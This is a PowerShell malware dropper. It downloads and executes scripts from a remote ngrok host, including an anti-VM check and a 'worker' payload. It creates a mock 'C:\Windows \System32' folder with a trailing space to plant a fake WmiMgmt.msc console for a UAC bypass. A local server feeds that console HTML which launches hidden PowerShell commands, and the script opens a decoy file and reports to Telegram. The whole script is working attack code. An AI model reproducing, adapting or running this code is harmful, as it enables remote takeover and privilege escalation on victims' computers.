function VMPROTECT {
    $link = ("https://ratte.ngrok.app/main/antivm.ps1")
    iex (iwr -uri $link -useb)
    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
}

$port = 8080
$htmlLoaderUrl = "http://localhost:$port"
$originalConsole = ""
$hackedConsole = ""
$fakeFile = ""
$Command = "powershell.exe"
$Arg = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `& {Invoke-RestMethod -Uri `'https://ratte.ngrok.app/main/zakrep/worker.ps1`' | Invoke-Expression}"
if ($debug){
	Write-Host "[+] Params Passed." -ForegroundColor Green
}

if ($debug){
	Write-Host "[*] Make Server on: http://localhost:$port/" -ForegroundColor Green
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$port/")
$listener.Start()

New-Item "\\?\C:\Windows \System32\" -ItemType Directory -ErrorAction SilentlyContinue > $null
New-Item "\\?\C:\Windows \System32\en-US" -ItemType Directory -ErrorAction SilentlyContinue > $null

$decodedBytesOriginal = [System.Convert]::FromBase64String($originalConsole)
$decodedBytesFakes = [System.Convert]::FromBase64String($hackedConsole)

if ($debug){
	Write-Host "[+] Make consoles." -ForegroundColor Green
}

[System.IO.File]::WriteAllBytes("C:\Windows \System32\WmiMgmt.msc", $decodedBytesOriginal)
[System.IO.File]::WriteAllBytes("C:\Windows \System32\en-US\WmiMgmt.msc", $decodedBytesFakes)
(Get-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc' -Raw) -replace '{htmlLoaderUrl}', $htmlLoaderUrl | Set-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc'

if ($fakeFile -ne $null -and $fakeFile -ne "") {
	if ($debug){
		Write-Host "[MAIN] Fake file opened: `n$fakeFile" -ForegroundColor Green
	}
    Start-Process $fakeFile
	$message = "$($redExclamation) [MAIN] Fake file opened: `n$fakeFile"
	Send-TelegramMessage -message $message
}

while ($listener.IsListening) {
	if ($global::debug){
		Write-Host "[*] Command received." -ForegroundColor Green
	}
	Start-Process -FilePath 'C:\Windows \System32\WmiMgmt.msc'
    $context = $listener.GetContext()
    $response = $context.Response
    $html =
@"
<html>
<head>
	<title>Game Over</title>
	<meta charset="UTF-8">
</head>
<body>
<script>
	external.ExecuteShellCommand("$Command", "", "$Arg", "Minimized");
	external.ExecuteShellCommand("$Command", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command & {taskkill /f /im mmc.exe}", "Minimized");
</script>
</body>
</html>
"@
	$buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
	$response.ContentLength64 = $buffer.Length
	$response.OutputStream.Write($buffer, 0, $buffer.Length)

	$response.Close()
	$listener.Stop()
}


